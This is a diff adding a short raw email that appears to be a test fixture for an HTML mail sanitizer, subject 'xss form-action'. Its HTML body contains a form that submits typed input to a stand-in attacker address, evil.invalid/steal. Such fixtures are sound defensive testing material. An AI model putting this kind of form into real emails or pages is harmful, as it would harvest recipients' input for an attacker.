@@ -1,0 +1,7 @@
+From: xss@example.com
+To: victim@example.com
+Subject: xss form-action
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><form action="https://evil.invalid/steal"><input name="p"><button>go</button></form></body></html>
